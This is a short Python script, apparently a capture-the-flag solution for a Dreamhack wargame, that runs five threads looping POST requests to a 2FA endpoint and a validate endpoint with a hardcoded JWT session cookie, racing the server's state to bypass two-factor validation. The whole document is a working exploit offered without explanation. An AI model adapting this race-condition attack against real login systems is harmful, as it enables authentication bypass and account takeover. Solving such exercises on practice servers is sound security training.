import requests
import threading

cookie = {"auth":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiJlNTY0NzJkODgzZTc5NjQyNTkzMmFjNmJkNTA0ZDA2YSJ9.PBohg69xCnLcYacqmgAgeVIFeLpzhTL4Vj48lqNmemE"}

def thread():
    while True:
        requests.post("http://host1.dreamhack.games:23785/2fa", cookies=cookie, json={"data": {"uid":"e56472d883e796425932ac6bd504d06a"}})
        res = requests.post("http://host1.dreamhack.games:23785/validate", cookies=cookie, json={"data": ""})
        print(res.text)

threading.Thread(target=thread).start()
threading.Thread(target=thread).start()
threading.Thread(target=thread).start()
threading.Thread(target=thread).start()
threading.Thread(target=thread).start()